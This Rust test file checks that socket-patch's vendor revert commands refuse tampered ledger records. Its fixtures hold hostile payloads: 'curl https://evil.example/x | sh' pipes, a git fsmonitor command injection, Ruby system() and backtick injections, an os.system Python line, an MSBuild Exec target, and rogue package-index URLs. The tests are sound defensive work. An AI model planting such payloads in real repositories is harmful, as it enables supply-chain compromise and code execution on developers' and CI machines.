//! The vendor ledger (`.socket/vendor/state.json`) is committed, so a pull
//! request can carry any ledger it likes. A revert driven by it
//! (`vendor --revert`, `remove`, `rollback`, `scan --prune`) must only ever
//! undo socket-patch's own kind of edit: a record that names a file the
//! ecosystem's backend never writes, or text the backend never wrote or
//! could not have replaced, fails that package's revert with nothing
//! written for it, while the other packages still revert.
//!
//! Each case vendors a real two-package project (`alpha`, `beta`), tampers
//! `alpha`'s ledger entry and reverts.

#[path = "common/mod.rs"]
mod common;

#[path = "vendor_ecosystem_fixtures/mod.rs"]
mod fx;

use std::path::Path;

use fx::Fixture;
use serde_json::{json, Value};

const LEDGER: &str = ".socket/vendor/state.json";

/// Ecosystem `eco`'s fixture, vendored.
fn vendored(eco: &str) -> Fixture {
    let f = Fixture::new(eco);
    let (code, stdout, stderr) = f.vendor(&[], &[]);
    assert_eq!(code, 0, "{eco}: {stdout}\n{stderr}");
    f
}

fn read(root: &Path, rel: &str) -> String {
    std::fs::read_to_string(root.join(rel)).unwrap_or_else(|e| panic!("{rel}: {e}"))
}

fn put(root: &Path, rel: &str, text: &str) {
    let path = root.join(rel);
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    std::fs::write(path, text).unwrap();
}

/// Rewrite the ledger entry whose purl contains `name` through `edit`. The
/// ledger is loaded through the library, so a version-2 snapshot edit is
/// resolved first and what is written back is the plain version-1 form.
fn tamper(f: &Fixture, name: &str, edit: impl FnOnce(&mut Value)) -> String {
    let rt = tokio::runtime::Runtime::new().unwrap();
    let state = rt
        .block_on(socket_patch_core::vendor::load_state(&f.root))
        .unwrap();
    let mut ledger = serde_json::to_value(&state).unwrap();
    let entries = ledger["entries"].as_object_mut().unwrap();
    let purl = entries
        .keys()
        .find(|purl| purl.to_lowercase().contains(name))
        .unwrap_or_else(|| panic!("no ledger entry for {name}"))
        .clone();
    edit(&mut entries[&purl]);
    std::fs::write(
        f.root.join(LEDGER),
        serde_json::to_vec_pretty(&ledger).unwrap(),
    )
    .unwrap();
    purl
}

/// Append `record` to the entry's wiring: reverts replay it first.
fn push_record(entry: &mut Value, record: Value) {
    entry["wiring"].as_array_mut().unwrap().push(record);
}

/// `vendor --revert`, which must fail `purl` with a `revert_failed` event
/// and leave its ledger entry in place.
fn revert_refusing(f: &Fixture, purl: &str) -> Value {
    let (code, stdout, stderr) = f.vendor(&["--revert"], &[]);
    assert_ne!(
        code, 0,
        "a refused package fails the run: {stdout}\n{stderr}"
    );
    let report: Value = serde_json::from_str(&stdout).unwrap_or_else(|e| panic!("{e}: {stdout}"));
    let failed = report["events"]
        .as_array()
        .unwrap()
        .iter()
        .find(|e| e["purl"] == purl && e["errorCode"] == "revert_failed")
        .unwrap_or_else(|| panic!("no revert_failed event for {purl}: {stdout}"));
    let detail = failed["error"].as_str().unwrap_or_default();
    assert!(
        detail.contains("ledger record"),
        "the refusal names the ledger record: {detail}"
    );
    let ledger: Value = serde_json::from_str(&read(&f.root, LEDGER)).unwrap();
    assert!(
        ledger["entries"].get(purl).is_some(),
        "the refused package keeps its ledger entry"
    );
    report
}

/// A `requirements_line` record aimed at `target`: replace the line `new`
/// (one that is really there) with `original`.
fn requirements_record(target: &str, new: &str, original: &[&str]) -> Value {
    json!({
        "file": target,
        "kind": "requirements_line",
        "action": "rewritten",
        "key": format!("{target}:1"),
        "new": new,
        "original": original,
    })
}

#[test]
fn requirements_record_cannot_rewrite_git_config() {
    let f = vendored("pypi-requirements");
    put(&f.root, ".git/config", "[core]\n\tbare = false\n");
    let purl = tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            requirements_record(
                ".git/config",
                "[core]",
                &["[core]", "\tfsmonitor = touch PWNED_BY_LEDGER"],
            ),
        )
    });
    let wired = read(&f.root, "requirements.txt");

    revert_refusing(&f, &purl);

    assert_eq!(read(&f.root, ".git/config"), "[core]\n\tbare = false\n");
    let after = read(&f.root, "requirements.txt");
    let alpha_line = |text: &str| {
        text.lines()
            .find(|l| l.contains("alpha"))
            .map(str::to_string)
    };
    assert_eq!(
        alpha_line(&after),
        alpha_line(&wired),
        "nothing is written for the refused package"
    );
    assert!(
        after.lines().any(|l| l == "beta==1.0.0"),
        "the other package still reverts: {after}"
    );
}

#[test]
fn requirements_record_cannot_rewrite_a_ci_workflow() {
    let f = vendored("pypi-requirements");
    let workflow = "jobs:\n  test:\n    steps:\n      - run: make test\n";
    put(&f.root, ".github/workflows/ci.yml", workflow);
    let purl = tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            requirements_record(
                ".github/workflows/ci.yml",
                "      - run: make test",
                &["      - run: curl https://evil.example/x | sh"],
            ),
        )
    });

    revert_refusing(&f, &purl);

    assert_eq!(read(&f.root, ".github/workflows/ci.yml"), workflow);
}

/// The file is one the backend edits, but the text to put back is not the
/// pin the vendor line replaced.
#[test]
fn requirements_record_cannot_restore_anything_but_the_pin() {
    for original in [
        // Another package, an index option and an include riding along.
        vec![
            "alpha==1.0.0",
            "--extra-index-url https://evil.example/simple",
        ],
        vec!["evil-package==6.6.6"],
        vec!["alpha @ https://evil.example/alpha-1.0.0-py3-none-any.whl"],
        vec!["-r https://evil.example/requirements.txt"],
    ] {
        let f = vendored("pypi-requirements");
        let wired = read(&f.root, "requirements.txt");
        let purl = tamper(&f, "alpha", |entry| {
            let record = &mut entry["wiring"][0];
            assert_eq!(record["kind"], "requirements_line");
            record["original"] = json!(original);
        });

        revert_refusing(&f, &purl);

        let after = read(&f.root, "requirements.txt");
        assert!(!after.contains("evil"), "{original:?}: {after}");
        assert_eq!(
            after.lines().find(|l| l.contains("alpha")),
            wired.lines().find(|l| l.contains("alpha")),
            "{original:?}"
        );
    }
}

/// A requirements record may only replace socket-patch's own vendor line.
#[test]
fn requirements_record_cannot_replace_a_line_vendor_did_not_write() {
    let f = vendored("pypi-requirements");
    let wired = format!("{}gamma==2.0.0\n", read(&f.root, "requirements.txt"));
    put(&f.root, "requirements.txt", &wired);
    let purl = tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            requirements_record("requirements.txt", "gamma==2.0.0", &["alpha==1.0.0"]),
        )
    });

    revert_refusing(&f, &purl);

    assert!(
        read(&f.root, "requirements.txt").contains("gamma==2.0.0\n"),
        "the user's own line stays"
    );
}

#[test]
fn script_record_cannot_replace_a_python_file() {
    let f = vendored("pylock");
    let script = "import sys\nprint(sys.argv)\n";
    put(&f.root, "manage.py", script);
    let purl = tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            json!({
                "file": "manage.py",
                "kind": "python_script_metadata",
                "action": "rewritten",
                "key": "alpha",
                "new": script,
                "original": "import os\nos.system('touch PWNED_BY_LEDGER')\n",
            }),
        )
    });
    let wired = read(&f.root, "pylock.toml");

    revert_refusing(&f, &purl);

    assert_eq!(read(&f.root, "manage.py"), script);
    let after = read(&f.root, "pylock.toml");
    assert!(
        after.contains(".socket/vendor/pypi/11111111-1111-4111-8111-000000000001"),
        "nothing is written for the refused package: {after}"
    );
    assert!(
        !after.contains(".socket/vendor/pypi/11111111-1111-4111-8111-000000000002"),
        "the other package still reverts: {after}"
    );
    assert_ne!(after, wired);
}

/// Inside a script's PEP 723 block a revert may only touch the vendored
/// package's own entries, and never the code around the block.
#[test]
fn script_record_cannot_change_code_or_other_dependencies() {
    let wheel =
        ".socket/vendor/pypi/11111111-1111-4111-8111-000000000001/alpha-1.0.0-py3-none-any.whl";
    let live = format!(
        "# /// script\n# dependencies = [\"alpha==1.0.0\"]\n#\n# [tool.uv.sources]\n\
         # alpha = {{ path = \"{wheel}\" }}\n# ///\nprint('ok')\n"
    );
    for original in [
        // The code after the block.
        "# /// script\n# dependencies = [\"alpha==1.0.0\"]\n# ///\nimport os; os.system('x')\n",
        // Another dependency inside the block.
        "# /// script\n# dependencies = [\"alpha==1.0.0\", \"evil-package\"]\n# ///\nprint('ok')\n",
    ] {
        let f = vendored("pylock");
        put(&f.root, "tool.py", &live);
        let purl = tamper(&f, "alpha", |entry| {
            push_record(
                entry,
                json!({
                    "file": "tool.py",
                    "kind": "python_script_metadata",
                    "action": "rewritten",
                    "key": "alpha",
                    "new": live,
                    "original": original,
                }),
            )
        });

        revert_refusing(&f, &purl);

        assert_eq!(read(&f.root, "tool.py"), live, "{original}");
    }
}

/// A pylock record may only put back the vendored package's own entry.
#[test]
fn pylock_record_cannot_rewrite_another_package() {
    let f = vendored("pylock");
    let wired = read(&f.root, "pylock.toml");
    let purl = tamper(&f, "alpha", |entry| {
        let record = &mut entry["wiring"][0];
        assert_eq!(record["kind"], "python_lock_document");
        // The live lock is what this record must find; what it restores
        // points an unrelated package somewhere else.
        record["new"] = json!(wired);
        record["original"] = json!(wired.replace(
            "https://files.example/filler00-1.0.0-py3-none-any.whl",
            "https://evil.example/filler00-1.0.0-py3-none-any.whl",
        ));
    });

    revert_refusing(&f, &purl);

    assert!(!read(&f.root, "pylock.toml").contains("evil.example"));
}

#[test]
fn gemfile_record_cannot_add_ruby_to_the_gemfile() {
    let f = vendored("gem");
    let purl = tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            json!({
                "file": "Gemfile",
                "kind": "gemfile_line",
                "action": "rewritten",
                "key": "alpha",
                "new": "source \"https://rubygems.org\"",
                "original":
                    "source \"https://rubygems.org\"; system(\"touch PWNED_BY_LEDGER\")",
            }),
        )
    });
    let wired = read(&f.root, "Gemfile");
    let wired_lock = read(&f.root, "Gemfile.lock");

    revert_refusing(&f, &purl);

    let after = read(&f.root, "Gemfile");
    assert!(!after.contains("system("), "{after}");
    assert!(
        after.lines().any(|l| l == "gem \"beta\""),
        "the other package still reverts: {after}"
    );
    assert_eq!(
        after.lines().find(|l| l.contains("alpha")),
        wired.lines().find(|l| l.contains("alpha")),
        "nothing is written for the refused package"
    );
    assert!(
        read(&f.root, "Gemfile.lock")
            .contains("remote: .socket/vendor/gem/11111111-1111-4111-8111-000000000001"),
        "{wired_lock}"
    );
}

/// The declaration put back must be the vendored gem's, with nothing but
/// literals after its name.
#[test]
fn gemfile_record_cannot_restore_a_computed_declaration() {
    for original in [
        "gem \"alpha\", system(\"touch PWNED_BY_LEDGER\").to_s",
        "gem \"alpha\", `touch PWNED_BY_LEDGER`",
        "gem \"alpha\", \"#{`touch PWNED_BY_LEDGER`}\"",
        "gem \"alpha\"; system(\"touch PWNED_BY_LEDGER\")",
        "gem \"alpha\", git: \"https://evil.example/alpha.git\"\nsystem(\"x\")",
        "gem \"omega\"",
    ] {
        let f = vendored("gem");
        let wired = read(&f.root, "Gemfile");
        let purl = tamper(&f, "alpha", |entry| {
            let record = &mut entry["wiring"][0];
            assert_eq!(record["kind"], "gemfile_line");
            record["original"] = json!(original);
        });

        revert_refusing(&f, &purl);

        let after = read(&f.root, "Gemfile");
        assert!(
            !after.contains("PWNED") && !after.contains("omega"),
            "{original}: {after}"
        );
        assert_eq!(
            after.lines().find(|l| l.contains("alpha")),
            wired.lines().find(|l| l.contains("alpha")),
            "{original}"
        );
    }
}

/// The lock lines put back are the gem's own spec block and nothing else.
#[test]
fn gem_lock_record_cannot_add_a_source_section() {
    let f = vendored("gem");
    let wired = read(&f.root, "Gemfile.lock");
    let purl = tamper(&f, "alpha", |entry| {
        let record = entry["wiring"]
            .as_array_mut()
            .unwrap()
            .iter_mut()
            .find(|r| r["kind"] == "gemfile_lock_spec")
            .unwrap();
        record["original"] = json!([
            "    alpha (1.0.0)\n\nGIT\n  remote: https://evil.example/alpha.git\n  revision: 0\n  specs:\n    alpha (1.0.0)",
            "  alpha"
        ]);
    });

    revert_refusing(&f, &purl);

    let after = read(&f.root, "Gemfile.lock");
    assert!(!after.contains("evil.example"), "{after}");
    assert_eq!(
        after.contains(".socket/vendor/gem/11111111-1111-4111-8111-000000000001"),
        wired.contains(".socket/vendor/gem/11111111-1111-4111-8111-000000000001")
    );
}

/// The lock pin is a quoted contentHash in a NuGet lock, not any quoted
/// string in any file.
#[test]
fn nuget_lock_record_cannot_rewrite_another_file() {
    let f = vendored("nuget");
    let script = "{\"scripts\": {\"build\": \"make\"}}\n";
    put(&f.root, "tools/build.json", script);
    let purl = tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            json!({
                "file": "tools/build.json",
                "kind": "nuget_lock_entry",
                "action": "rewritten",
                "key": "Fx.Alpha",
                "new": "make",
                "original": "curl https://evil.example/x | sh",
            }),
        )
    });

    revert_refusing(&f, &purl);

    assert_eq!(read(&f.root, "tools/build.json"), script);
}

/// A lock record cannot swap in a value that is not a contentHash either.
#[test]
fn nuget_lock_record_cannot_restore_anything_but_a_content_hash() {
    let f = vendored("nuget");
    let wired = read(&f.root, "packages.lock.json");
    let purl = tamper(&f, "alpha", |entry| {
        let record = entry["wiring"]
            .as_array_mut()
            .unwrap()
            .iter_mut()
            .find(|r| r["kind"] == "nuget_lock_entry")
            .unwrap();
        record["original"] = json!("x\", \"resolved\": \"9.9.9");
    });

    revert_refusing(&f, &purl);

    let after = read(&f.root, "packages.lock.json");
    assert!(!after.contains("9.9.9"), "{after}");
    assert_eq!(
        after.contains("Fx.Alpha"),
        wired.contains("Fx.Alpha"),
        "{after}"
    );
}

/// The config record restores (or deletes) a NuGet config, never another
/// file at the root.
#[test]
fn nuget_config_record_cannot_replace_another_root_file() {
    let f = vendored("nuget");
    let props = "<Project />\n";
    put(&f.root, "Directory.Build.props", props);
    let purl = tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            json!({
                "file": "Directory.Build.props",
                "kind": "nuget_config_source",
                "action": "rewritten",
                "key": "socket-patch-11111111-1111-4111-8111-000000000001",
                "new": props,
                "original": "<Project><Target Name=\"x\" BeforeTargets=\"Build\">\
                             <Exec Command=\"touch PWNED_BY_LEDGER\" /></Target></Project>\n",
            }),
        )
    });

    revert_refusing(&f, &purl);

    assert_eq!(read(&f.root, "Directory.Build.props"), props);
}

/// The whole-file text a config record carries is only ever a shortcut for
/// "the live config minus the lines vendoring added": a recorded original
/// that differs from the live file in any other way is never written.
#[test]
fn nuget_config_restore_never_writes_text_vendoring_did_not_remove() {
    let f = vendored("nuget");
    let live = read(&f.root, "nuget.config");
    // The first package reverted finds the live file as its `new`.
    tamper(&f, "alpha", |entry| {
        let record = &mut entry["wiring"][0];
        assert_eq!(record["kind"], "nuget_config_source");
        record["new"] = json!(live);
        record["original"] = json!(live.replace(
            "  </packageSources>",
            "    <add key=\"evil\" value=\"https://evil.example/v3/index.json\" />\n  </packageSources>",
        ));
    });

    let (code, stdout, stderr) = f.vendor(&["--revert"], &[]);
    assert_eq!(code, 0, "{stdout}\n{stderr}");

    let after = read(&f.root, "nuget.config");
    assert!(!after.contains("evil"), "{after}");
    assert!(!after.contains("socket-patch-"), "{after}");
}

/// A config record marked as created by vendoring cannot delete a config
/// the user wrote.
#[test]
fn nuget_config_record_cannot_delete_a_user_config() {
    let f = vendored("nuget");
    let live = read(&f.root, "nuget.config");
    tamper(&f, "alpha", |entry| {
        let record = &mut entry["wiring"][0];
        assert_eq!(record["kind"], "nuget_config_source");
        record["action"] = json!("added");
        record.as_object_mut().unwrap().remove("original");
        record["new"] = json!(live);
    });

    let (_, stdout, stderr) = f.vendor(&["--revert"], &[]);

    assert!(
        f.root.join("nuget.config").exists(),
        "the user's config survives: {stdout}\n{stderr}"
    );
    assert!(read(&f.root, "nuget.config").contains("fixtureSetting00"));
}

/// #VN-S1: credentials in `nuget.config` never reach the committed ledger,
/// and the revert still puts the config back with them.
#[test]
fn nuget_ledger_carries_no_config_credentials() {
    let f = Fixture::new("nuget");
    let config = read(&f.root, "nuget.config").replace(
        "  <config>\n",
        "  <packageSourceCredentials>\n    <private-feed>\n      \
         <add key=\"Username\" value=\"ci-user\" />\n      \
         <add key=\"ClearTextPassword\" value=\"s3cr3t-feed-TOKEN\" />\n    \
         </private-feed>\n  </packageSourceCredentials>\n  <config>\n    \
         <add key=\"http_proxy.password\" value=\"pr0xy-PASSWORD\" />\n",
    );
    put(&f.root, "nuget.config", &config);

    let (code, stdout, stderr) = f.vendor(&[], &[]);
    assert_eq!(code, 0, "{stdout}\n{stderr}");
    let ledger = read(&f.root, LEDGER);
    for secret in ["s3cr3t-feed-TOKEN", "pr0xy-PASSWORD", "ci-user"] {
        assert!(!ledger.contains(secret), "the ledger holds {secret}");
    }
    let wired = read(&f.root, "nuget.config");
    assert!(wired.contains("s3cr3t-feed-TOKEN") && wired.contains("socket-patch-"));

    let (code, stdout, stderr) = f.vendor(&["--revert"], &[]);
    assert_eq!(code, 0, "{stdout}\n{stderr}");
    let after = read(&f.root, "nuget.config");
    assert!(
        after.contains("s3cr3t-feed-TOKEN") && after.contains("pr0xy-PASSWORD"),
        "{after}"
    );
    assert!(!after.contains("socket-patch-"), "{after}");
}

/// Every reverting command shares the refusal: `rollback` here.
#[test]
fn rollback_refuses_the_same_tampered_record() {
    let f = vendored("gem");
    let wired = read(&f.root, "Gemfile");
    tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            json!({
                "file": "Gemfile",
                "kind": "gemfile_line",
                "action": "rewritten",
                "key": "alpha",
                "new": "source \"https://rubygems.org\"",
                "original":
                    "source \"https://rubygems.org\"; system(\"touch PWNED_BY_LEDGER\")",
            }),
        )
    });

    let (code, stdout, stderr) = f.run(&["rollback", "--json", "--yes"], &[]);

    assert_ne!(code, 0, "{stdout}\n{stderr}");
    assert!(
        stdout.contains("ledger record"),
        "the refusal is the reason: {stdout}\n{stderr}"
    );
    let after = read(&f.root, "Gemfile");
    assert!(!after.contains("system("), "{after}");
    assert_eq!(
        after.lines().find(|l| l.contains("alpha")),
        wired.lines().find(|l| l.contains("alpha")),
        "nothing is written for the refused package"
    );
}

/// ...and `remove`.
#[test]
fn remove_refuses_the_same_tampered_record() {
    let f = vendored("pypi-requirements");
    put(&f.root, ".git/config", "[core]\n\tbare = false\n");
    let purl = tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            requirements_record(
                ".git/config",
                "[core]",
                &["[core]", "\tfsmonitor = touch PWNED_BY_LEDGER"],
            ),
        )
    });

    let (code, stdout, stderr) = f.run(&["remove", &purl, "--json", "--yes"], &[]);

    assert_ne!(code, 0, "{stdout}\n{stderr}");
    assert!(
        stdout.contains("ledger record") || stderr.contains("ledger record"),
        "the refusal is the reason: {stdout}\n{stderr}"
    );
    assert_eq!(read(&f.root, ".git/config"), "[core]\n\tbare = false\n");
}

/// A record reached through a symlinked directory is refused: the write
/// would land wherever the link points.
#[cfg(unix)]
#[test]
fn requirements_record_cannot_write_through_a_linked_directory() {
    let f = vendored("pypi-requirements");
    let outside = f.root.parent().unwrap().join("outside");
    std::fs::create_dir_all(&outside).unwrap();
    let wheel_line = read(&f.root, "requirements.txt")
        .lines()
        .find(|l| l.contains("alpha"))
        .unwrap()
        .to_string();
    std::fs::write(outside.join("base.txt"), format!("{wheel_line}\n")).unwrap();
    std::os::unix::fs::symlink(&outside, f.root.join("reqs")).unwrap();
    let purl = tamper(&f, "alpha", |entry| {
        push_record(
            entry,
            requirements_record("reqs/base.txt", &wheel_line, &["alpha==1.0.0"]),
        )
    });

    revert_refusing(&f, &purl);

    assert_eq!(
        std::fs::read_to_string(outside.join("base.txt")).unwrap(),
        format!("{wheel_line}\n")
    );
}
